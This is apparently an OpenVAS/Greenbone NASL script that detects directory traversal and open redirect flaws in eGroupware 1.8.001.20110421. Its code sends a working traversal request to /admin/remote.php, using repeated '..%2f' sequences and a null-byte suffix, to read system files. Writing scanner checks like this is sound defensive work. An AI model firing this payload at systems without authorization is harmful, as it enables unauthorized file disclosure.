CPE = "cpe:/a:egroupware:egroupware";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801944" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)" );
	script_cve_id( "CVE-2011-4951", "CVE-2011-4950", "CVE-2011-4949", "CVE-2011-4948" );
	script_bugtraq_id( 52770 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "eGroupware Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_egroupware_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "egroupware/installed" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17322/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101676/eGroupware1.8.001.20110421-LFI.txt" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101675/eGroupware1.8.001.20110421-Redirect.txt" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application or to redirect to an arbitrary URL." );
	script_tag( name: "affected", value: "eGroupware version 1.8.001.20110421" );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - An input validation error in 'type' parameter to '/admin/remote.php?', which
  allows attackers to read arbitrary files via a ..%2f(dot dot) sequences.

  - An open redirect vulnerability in '/phpgwapi/ntlm/index.php?', when handling
  the URL." );
	script_tag( name: "solution", value: "Upgrade to version 1.8.001.20110805 or later." );
	script_tag( name: "summary", value: "This host is running the eGroupware and is prone to multiple
  vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.egroupware.org" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( dir, "/admin/remote.php?uid=a&type=", crap( data: "..%2f", length: 3 * 15 ), files[file], "%00.jpg&creator_email=a" );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

